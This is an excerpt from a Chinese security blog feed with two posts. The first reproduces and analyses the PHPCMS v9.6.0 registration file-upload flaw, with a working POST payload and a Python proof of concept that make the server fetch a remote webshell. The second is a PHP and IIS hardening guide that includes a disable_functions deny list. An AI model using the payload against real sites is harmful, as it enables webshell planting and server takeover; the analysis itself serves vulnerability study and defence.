    <url>/2017/08/10/web/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>注册页面<a href="http://127.0.0.1/audit/phpcms/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1" target="_blank" rel="noopener">http://127.0.0.1/audit/phpcms/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</a></p>
<p>提交post数据，如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">siteid=1&amp;modelid=1&amp;username=123123123&amp;password=123asdf456&amp;email=123123123qwe@qq.com&amp;info[content]=&lt;img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>
<p>页面会返回shell地址，菜刀连接即可；</p>
<p><a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/54698372.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/54698372.jpg" alt="img"></a></p>
<a id="more"></a>
<p>现提供一个简化的py版POC：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span>  </span><br><span class="line">    u = <span class="string">'&#123;&#125;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1'</span>.format(url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'siteid'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'modelid'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'testxx'</span>,</span><br><span class="line">        <span class="string">'email'</span>: <span class="string">'test@test.com'</span>,</span><br><span class="line">        <span class="string">'info[content]'</span>: <span class="string">'&lt;img src=http://url/shell.txt?.php#.jpg&gt;'</span>,</span><br><span class="line">        <span class="string">'dosubmit'</span>: <span class="string">'1'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.post(u, data=data)</span><br><span class="line"></span><br><span class="line">    shell = <span class="string">''</span></span><br><span class="line">    re_result = re.findall(<span class="string">r'&amp;lt;img src=(.*)&amp;gt'</span>, rep.content)</span><br><span class="line">    <span class="keyword">if</span> len(re_result):</span><br><span class="line">        shell = re_result[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> shell</span><br></pre></td></tr></table></figure>
<p>PS： 之所以说简化，是因为注册时用户名和邮箱有所限制，实际中应该随机生成，不应相同，后续代码分析中会提到；</p>
<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>根据注册页面url，模块为member，控制器为index，事件为register，定位到文件phpcmsv9/phpcms/modules/member/index.php，其中的register函数；</p>
<p>代码会对post数据进行处理，相应位置下断点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br></pre></td></tr></table></figure>
<p>new_html_special_chars函数处理，尖括号实例化；：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);</span><br></pre></td></tr></table></figure>
<p>进入get，继续跟进：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">   $model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line">   <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">   $info = <span class="keyword">array</span>();</span><br><span class="line">   $debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line">   <span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line">      <span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line">         <span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">         $field = safe_replace($field);</span><br><span class="line">         $name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">         $minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</span><br><span class="line">         $maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">         $pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">         $errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line">         <span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name 不符合要求！"</span>;</span><br><span class="line">         $length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line">         <span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name 不得少于 $minlength 个字符！"</span>);</span><br><span class="line">         <span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'模型中不存在'</span>.$field.<span class="string">'字段'</span>);</span><br><span class="line">         <span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">            showmessage(<span class="string">"$name 不得超过 $maxlength 个字符！"</span>);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str_cut($value, $maxlength);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name 的值不得重复！"</span>);</span><br><span class="line">         $func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line">         <span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">         $info[$field] = $value;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进入trim_script函数，对script等关键字做了过滤，data无改变；</p>
<p>又对其做了一些长度等乱七八糟的判断，继续往下走，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></table></figure>
<p>此时$func=editor，再进入editor函数；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">   $setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">   $enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line">   $site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">   $watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">   $value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line">   <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续进入download函数，进行文件的下载，url的处理也在这；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;		<span class="comment">//限制了后缀名，$ext = 'gif|jpg|jpeg|bmp|png'</span></span><br><span class="line">    <span class="keyword">global</span> $image_d;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">    $upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);	<span class="comment">//获取了系统设置的上传路径；</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">    $dir = date(<span class="string">'Y/md/'</span>);		<span class="comment">//当前时间</span></span><br><span class="line">    $uploadpath = $upload_url.$dir;		<span class="comment">//路径+以时间为基础的随机名字</span></span><br><span class="line">    $uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;	<span class="comment">//上传时的物理路径</span></span><br><span class="line">    $string = new_stripslashes($value);		  <span class="comment">//对value进行转义</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;<span class="comment">//进行正则匹配，得到href的属性值；因为ext的限制，因此shell的后缀加上.jpg；</span></span><br><span class="line">    $remotefileurls = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">        dir_create($uploaddir);		<span class="comment">//创建上传路径；</span></span><br><span class="line">        $remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);		<span class="comment">//经过此函数，#后的.jpg会去掉，后缀变成.php</span></span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unset</span>($matches, $string);</span><br><span class="line">    $remotefileurls = array_unique($remotefileurls);</span><br><span class="line">    $oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">        $filename = fileext($file);		<span class="comment">//得到最终保存到本地的php文件名（包含url路径）</span></span><br><span class="line">        $file_name = basename($file);		<span class="comment">//php文件名</span></span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">        $newfile = $uploaddir.$filename;	<span class="comment">////得到最终保存到本地的php文件名（包含物理路径）</span></span><br><span class="line">        $upload_func = <span class="keyword">$this</span>-&gt;upload_func;		<span class="comment">//此时为copy函数</span></span><br><span class="line">        <span class="keyword">if</span>($upload_func($file, $newfile)) &#123;		<span class="comment">//copy函数，实现远程文件到本地的下载；</span></span><br><span class="line">            $oldpath[] = $k;</span><br><span class="line">            $GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">            @chmod($newfile, <span class="number">0777</span>);		<span class="comment">//改变文件权限；</span></span><br><span class="line">            $fileext = fileext($filename);	<span class="comment">//得到后缀名php</span></span><br><span class="line">            <span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">                watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">            &#125;</span><br><span class="line">            $filepath = $dir.$filename;</span><br><span class="line">            $downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">            $aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>万恶的copy函数，</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>5.3.0</td>
<td>增加了对 context 的支持。</td>
</tr>
<tr>
<td>4.3.0</td>
<td>如果启用了”fopen wrappers”的话，<code>source</code> 和     <code>dest</code> 都可以是 URL。更多细节见 <a href="mk:@MSITStore:F:%5CLearning%5C%E5%B8%B8%E7%94%A8%E6%89%8B%E5%86%8C%5Cphp_manual_zh.chm::/res/function.fopen.html" target="_blank" rel="noopener">fopen()</a>。</td>
</tr>
</tbody>
</table>
<p>而<code>fopen</code>一般都是可用的，如果开启了<code>allow_url_fopen</code>，这个漏洞就构成了，然而大部分环境都默认开启了<code>allow_url_fopen</code>。</p>
<p>其中，fillurl函数比较重要，部分代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillurl</span><span class="params">($surl, $absurl, $basehref = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($basehref != <span class="string">''</span>) &#123;</span><br><span class="line">      $preurl = strtolower(substr($surl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">      <span class="keyword">if</span>($preurl==<span class="string">'http://'</span> || $preurl==<span class="string">'ftp://'</span> ||$preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">'rtsp://'</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule://'</span>|| $preurl==<span class="string">'ed2k://'</span>)</span><br><span class="line">      <span class="keyword">return</span>  $surl;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> $basehref.<span class="string">'/'</span>.$surl;</span><br><span class="line">   &#125;</span><br><span class="line">   $i = <span class="number">0</span>;</span><br><span class="line">   $dstr = <span class="string">''</span>;</span><br><span class="line">   $pstr = <span class="string">''</span>;</span><br><span class="line">   $okurl = <span class="string">''</span>;</span><br><span class="line">   $pathStep = <span class="number">0</span>;</span><br><span class="line">   $surl = trim($surl);		<span class="comment">//去空白字符</span></span><br><span class="line">   <span class="keyword">if</span>($surl==<span class="string">''</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">   $urls = @parse_url(SITE_URL);	<span class="comment">//解析 URL，返回其组成部分,在这返回相关数组</span></span><br><span class="line">   $HomeUrl = $urls[<span class="string">'host'</span>];		<span class="comment">//主机地址</span></span><br><span class="line">   $BaseUrlPath = $HomeUrl.$urls[<span class="string">'path'</span>];</span><br><span class="line">   $BaseUrlPath = preg_replace(<span class="string">"/\/([^\/]*)\.(.*)$/"</span>,<span class="string">'/'</span>,$BaseUrlPath);</span><br><span class="line">   $BaseUrlPath = preg_replace(<span class="string">"/\/$/"</span>,<span class="string">''</span>,$BaseUrlPath);</span><br><span class="line">   $pos = strpos($surl,<span class="string">'#'</span>);		<span class="comment">//查找#位置；</span></span><br><span class="line">   <span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);		<span class="comment">//截取掉#及后面字符，后缀变成.php</span></span><br><span class="line">   <span class="keyword">if</span>($surl[<span class="number">0</span>]==<span class="string">'/'</span>) &#123;</span><br><span class="line">      $okurl = <span class="string">'http://'</span>.$HomeUrl.<span class="string">'/'</span>.$surl;</span><br><span class="line">   &#125; <span class="keyword">elseif</span>($surl[<span class="number">0</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strlen($surl)&lt;=<span class="number">2</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">  .......</span><br><span class="line">  .......</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $okurl = preg_replace(<span class="string">'/^(http:\/\/)/i'</span>,<span class="string">''</span>,$okurl);</span><br><span class="line">      $okurl = preg_replace(<span class="string">'/\/&#123;1,&#125;/i'</span>,<span class="string">'/'</span>,$okurl);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'http://'</span>.$okurl;		<span class="comment">//最终返回一个完整的合法的远程shell的url地址；</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时，远程shell即下载到本地，只不过具体路径和文件名都是以日期和时间为基础，随机的。</p>
<p>下面就要考虑shell地址的获取，两种主要思路，一时获取phpcms的通用上传路径后，再对日期和时间组成的文件名进行爆破处理；还有一种便是接下里insert时，使数据库报错得到；</p>
<p>下载完成后，又回到register函数；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$status = <span class="keyword">$this</span>-&gt;client-&gt;ps_member_register($userinfo[<span class="string">'username'</span>], $userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'email'</span>], $userinfo[<span class="string">'regip'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line"><span class="keyword">if</span>($status &gt; <span class="number">0</span>) &#123;</span><br><span class="line">   $userinfo[<span class="string">'phpssouid'</span>] = $status;</span><br><span class="line">   <span class="comment">//传入phpsso为明文密码，加密后存入phpcms_v9</span></span><br><span class="line">   $password = $userinfo[<span class="string">'password'</span>];		<span class="comment">//获取密码字段</span></span><br><span class="line">   $userinfo[<span class="string">'password'</span>] = password($userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line">   $userid = <span class="keyword">$this</span>-&gt;db-&gt;insert($userinfo, <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;   <span class="comment">//如果开启选择模型</span></span><br><span class="line">      $user_model_info[<span class="string">'userid'</span>] = $userid;</span><br><span class="line">      <span class="comment">//插入会员模型数据</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;db-&gt;set_model($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;db-&gt;insert($user_model_info);		<span class="comment">//进入insert函数插入数据；</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>只有在其大于0时才会又插入数据库的操作，否则就会操作失败；</p>
<p>showmessage(L(‘operation_failure’), HTTP_REFERER);</p>
<p><a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/36468653.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/36468653.jpg" alt="img"></a></p>
<p>进入ps_member_register函数看一下影响status值得因素；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ps_member_register</span><span class="params">($username, $password, $email, $regip=<span class="string">''</span>, $random=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;_is_email($email)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_ps_send(<span class="string">'register'</span>, <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username, <span class="string">'password'</span>=&gt;$password, <span class="string">'email'</span>=&gt;$email, <span class="string">'regip'</span>=&gt;$regip, <span class="string">'random'</span>=&gt;$random));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>邮箱已存在时会返回-3，也就是说邮箱不能与已存在的重复，这也是前面复现，多次测试时，要随机生成的缘故；</p>
<p>其他情况又会进入_ps_send函数，然后又进入ps_post函数，没有继续深入，猜测是与用户名及邮箱的限制，测试的时候尽量保持相关信息的不重复即可；</p>
<p>继续看insert操作，最终会进入insert函数进行数据插入；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($data, $return_insert_id = false, $replace = false)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;insert($data, <span class="keyword">$this</span>-&gt;table_name, $return_insert_id, $replace);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在model.class.php中得到当前数据库为v9_member_detail，<a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/73395338.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/73395338.jpg" alt="img"></a></p>
<p>insert函数中得到其插入字段；</p>
<p><a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/31830217.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/31830217.jpg" alt="img"></a></p>
<p>也就是说，向<code>v9_member_detail</code>的<code>content</code>和<code>userid</code>两列插入数据；</p>
<p>再来看一下此数据表的结构：</p>
<p><a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/64317462.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/64317462.jpg" alt="img"></a></p>
<p>并没有content字段，也就造成了数据库报错，得到shell地址；</p>
<p>如此，就不用爆破了，太野蛮。</p>
<h1 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1，<a href="http://paper.seebug.org/273/" target="_blank" rel="noopener">http://paper.seebug.org/273/</a></p>
<p>2，<a href="http://www.hackersb.cn/hacker/219.html" target="_blank" rel="noopener">http://www.hackersb.cn/hacker/219.html</a></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>1，phpstorm+xdebug，可下断点，可开启监听，观察php执行结果，</p>
<p><a href="https://segmentfault.com/a/1190000004339411" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004339411</a>（如何配置？）</p>
<p>2，代码读起来还是很吃力，只搞懂了大体思路流程，其总体运行细节日后仍需学习，</p>
<p><a href="http://v9.help.phpcms.cn" target="_blank" rel="noopener">http://v9.help.phpcms.cn</a>（phpcms v9开发文档）</p>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器相关安全设置</title>
    <url>/2017/06/18/web/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="服务器相关安全设置"><a href="#服务器相关安全设置" class="headerlink" title="服务器相关安全设置"></a>服务器相关安全设置</h1><ul>
<li>web安全不仅与php.ini设置有关，还与目录权限、web服务器运行权限等紧密相关</li>
<li>目的：就算被上传webshell，也不能执行</li>
</ul>
<a id="more"></a>
<h2 id="01-php-ini与web安全"><a href="#01-php-ini与web安全" class="headerlink" title="01-php.ini与web安全"></a>01-php.ini与web安全</h2><ul>
<li><p>register_globals</p>
<ul>
<li>这个配置影响到php如何接收传递过来的参数，说白了register_globals的意思就是注册为全局变量，所以当该参数为值On的时候，传递过来 的值会被直接的注册为全局变量直接使用，而当该参数值为Off的时候，我们需要到从特定的数组里去得到它。 （php目前的最高版中此参数都是默认是Off ）</li>
<li>表单提交时<ul>
<li>register_globals=Off时，服务器端获取数据的时候用<code>$_GET[&#39;user_name&#39;]</code>和<code>$_GET[&#39;user_password&#39;]</code><br> 当然当form的method的属性为post的时候用<code>$_POST[&#39;user_name&#39;]</code>，<code>$_POST[&#39;user_name&#39;]</code></li>
<li>register_globals=On时，服务器端程序可以直接使用<code>$user_name</code>和<code>$user_pass</code>这样的全局变量值来接受值</li>
</ul>
</li>
<li>php4.2版本后默认关闭</li>
</ul>
</li>
<li><p>magic_quotes_gpc</p>
<ul>
<li>如果你把magic_quotes_gpc设置成了Off，那么php就不会对4种字符‘ (单引号)， “ (双引号)， \ (反斜线) 和 空字符进行转义，那这样的话就会造成服务器可能会被非法注入的可能</li>
<li>但是如果你把Magic_quotes_gpc设置成On的话，php就会 给<code>$_POST</code>，<code>$_GET</code>，<code>$_COOKIE</code>提交的变量中如果有上面四种字符的话就会加上\反斜扛.这样就会大大地提高php的安全性 </li>
</ul>
</li>
<li><p>display_errors </p>
<ul>
<li>对display_errors没有进行设置，导致web目录泄露</li>
<li>这对于黑客来说可是非常重要的信息，因为很多时候的渗透都需要知道web目录，例如webshell的写入等等 </li>
</ul>
</li>
<li><p>safe_mode</p>
<ul>
<li>就是我们常说的安全模式</li>
<li>php的安全模式是个非常重要的内嵌的安全机制，能够控制一些php中的函数</li>
<li>比如system()等函 数，同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的访问，比如/etc/passwd，但是默认的php.ini是没有打开安全模式的 </li>
</ul>
</li>
<li><p>open_basedir</p>
<ul>
<li>使用open_basedir选项能够控制PHP脚本只能访问指定的目录，这样能够避免PHP脚本访问不应该访问的文件，一定 程度上限制了webshell的危害</li>
<li>我们一般可以设置为只能访问网站目录（假设网站目录为E:\test）：open_basedir = E:\test </li>
<li>如果启用，可以有效的消除本地文件或者远程文件被include()等函数的调用攻击</li>
</ul>
</li>
<li><p>disable_functions </p>
<ul>
<li><p>使用disable_functions可以限制一些对于系统来说威胁很大的函数，</p>
</li>
<li><p>建议设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">disable_functions = phpinfo，passthru，exec ，system，chroot，scandir，chgrp，chown，shell_exec，proc_open，proc_get_status，ini_alter，ini_alter，ini_restore，dl，pfsockopen，openlog，syslog，readlink，symlink，popepassthru，stream_socket_server</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>com.allow_dcom</p>
<ul>
<li>PHP设置即使在安全模式下(safe_mode)，仍旧允许攻击者使用COM()函数来创建系统组件来执行任意命令 </li>
<li>如果是默认的Apache设置或者Web服务器以Loacalsystem权限或Administrators权限运行，攻击者可以使用这个漏洞来提升权限。</li>
<li>我们需要吧这个参数修改成com.allow_dcom=false </li>
</ul>
</li>
<li><p>allow_url_fopen</p>
<ul>
<li>作用是调用远程文件的功能，如果开启就支持远程调用文件</li>
</ul>
</li>
<li><p>expose_php</p>
<ul>
<li>这个参数决定是否暴露 PHP 被安装在服务器上</li>
<li>如果这个参数设置为On的话就会把php的版本等泄露出来了。</li>
<li>推荐值是Off </li>
</ul>
</li>
</ul>
<h2 id="02-IIS安全配置"><a href="#02-IIS安全配置" class="headerlink" title="02-IIS安全配置"></a>02-IIS安全配置</h2><ul>
<li>设置目录属性不能运行脚本文件<ul>
<li>这里有三个选项，分别是无，纯脚本，还有一个是脚本和可执行文件。</li>
<li>这里我们选择无 ，试图从目录中执行 CGI、ISAPI 或其他可执行程序，但该目录不允许执行程序</li>
</ul>
</li>
<li>给特定的目录上集成Windows 2003的身份验证功能，<ul>
<li>例如后台的设置，访问的时候就会另外要求输入操作系统的登陆密码</li>
</ul>
</li>
<li>服务器只支持php其他任何脚本都不支持 </li>
<li>对网站用户的权限设置<ul>
<li>将网站目录对匿名网站用户访问设置为不可写，但对图片目录等需要可写的目录设置为可写</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>安全设置</tag>
      </tags>
  </entry>
</search>
